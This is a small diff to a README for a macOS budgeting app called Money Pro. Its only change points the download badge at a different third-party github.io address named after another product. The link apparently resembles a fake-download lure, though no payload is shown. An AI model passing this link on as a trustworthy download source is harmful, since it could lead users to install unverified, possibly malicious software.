@@ -2,7 +2,7 @@
 
 Money Pro is the ultimate finance and budget planner app for macOS. Whether you're managing personal expenses or small business finances, Money Pro gives you everything you need — from budgets and bills to powerful analytics and beautiful UI.
 
-[![🚀 Download Money Pro 🟣](https://img.shields.io/badge/Download-Money%20Pro-blueviolet)](https://money-pro-mac-download.github.io/.github)
+[![🚀 Download Money Pro 🟣](https://img.shields.io/badge/Download-Money%20Pro-blueviolet)](https://moneydance-mac-download.github.io/.github)
 
 ---
 
